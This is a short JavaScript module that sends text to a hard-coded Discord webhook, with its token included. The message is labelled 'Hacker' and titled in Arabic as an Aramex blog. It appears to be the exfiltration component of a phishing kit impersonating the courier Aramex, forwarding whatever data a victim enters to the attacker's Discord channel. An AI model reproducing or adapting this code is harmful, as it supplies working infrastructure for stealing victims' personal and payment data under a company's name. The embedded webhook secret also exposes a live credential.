import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323675322301812806/SytlnzPu_9UuTjkTJytL5U9Q3FVqQfy6kear5vCb9oTP8NzU3mn_OGR3T5U2F6vFO6vA",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
